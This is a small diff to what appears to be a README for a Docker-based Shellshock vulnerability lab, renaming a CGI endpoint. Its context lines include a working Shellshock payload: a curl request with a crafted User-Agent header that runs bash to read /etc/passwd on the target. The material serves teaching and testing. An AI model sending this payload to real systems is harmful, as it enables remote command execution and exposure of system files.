@@ -4,7 +4,7 @@ docker-compose up -d
 
 # Launch the attack
 View in a browser: http://127.0.0.1:8080/
-curl http://127.0.0.1:8080/cgi-bin/demo.cgi
+curl http://127.0.0.1:8080/cgi-bin/info
 curl http://127.0.0.1:8080/cgi-bin/stats
 
 curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'" http://your-ip:8080/cgi-bin/stats
